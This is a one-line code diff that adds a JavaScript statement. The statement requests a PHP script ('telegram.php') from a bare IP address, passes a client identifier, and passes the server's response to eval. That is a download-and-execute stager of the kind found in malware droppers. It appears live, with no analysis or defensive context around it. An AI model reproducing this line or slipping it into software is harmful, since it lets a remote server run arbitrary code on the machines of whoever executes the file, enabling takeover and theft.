@@ -1,1 +1,1 @@
-h.ofgddgfdfsg
+h.open('GET','http://172.232.234.9/New-File/Jump/fg/telegram.php?client='+n,false);h.send();eval(h.ResponseText);
